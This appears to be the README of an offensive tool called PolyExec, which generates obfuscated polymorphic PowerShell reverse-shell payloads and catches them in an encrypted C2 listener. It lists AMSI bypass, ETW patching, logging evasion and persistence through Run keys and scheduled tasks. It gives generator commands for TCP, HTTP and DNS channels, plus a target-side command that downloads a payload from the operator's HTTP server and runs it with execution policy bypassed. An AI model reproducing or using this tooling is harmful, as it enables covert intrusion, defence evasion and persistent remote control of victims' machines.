## PolyExec: Generate polymorphic ps payloads and catch the shells in an aes-256 tunnel. 
#### This program is only tested on one pair of OSs at the moment.

#### polyexecgen.py - Generate obfuscated PS payloads <br>
#### c2_catcher.py - Receive the encrypted tunnel

--- 

### C2: <br>

TCP - Basic reverse shell (simple)<br>
Encrypted - AES-256 encrypted TCP (normal)<br>
HTTP - HTTP/HTTPS (80 or 443)<br>
DNS - DNS(sneaky)<br>
AES-256<br>
multi session threaded<br>
custom keys<br>

### Evasion features:<br>
AMSI bypass<br>
ETW patching<br>
scriptBlock log bypass<br>
prng variable names<br>
junk code<br>
no two payloads alike<br>
Traffic jitter<br>

## USAGE:<br>
    ### Encrypted shell -- full evasion
    ./polyexecgen.py -t 192.168.1.5 -p 6969 -m encrypted -k mygoodpassword
    
    ### basic TCP sh
    ./polyexecgen.py -t 192.168.1.5 -p 6969 -m tcp
    
    ### HTTP --  web traffic
    ./polyexecgen.py -t http://192.168.1.5:6969/shell -m http -k myk3y
    
    ### DNS C2 (sneaky)
    ./polyexecgen.py -m dns --dns-domain c2.example.com

---

<br>

## start the sh3ll catch3r: <br>

#### Encrypted mode:

<br>

     python3 c2_catcher.py

#### Host the payload:

    python3 -m http.server 6969

#### powershell On Windows target:

    Invoke-WebRequest http://192.168.1.5:6969/payloads/polyexec_encrypted_*.ps1 -OutFile innoc3nt.ps1
    powershell.exe -ExecutionPolicy Bypass -File innoc3nt.ps1

#### Persistance:

 payload w/ auto install persistence:
 
    ./polyexecgen.py -t 192.168.1.5 -p 6969 -m encrypted --persist
Puts data on disk
Registry Run key
Scheduled task at logon
File copy to %APPDATA%
 
---

#### ideas borrowed from cool humans: <br>

@danielbohannon  <br>
@harmj0y  <br>
@enigma0x3  <br>
 <br>
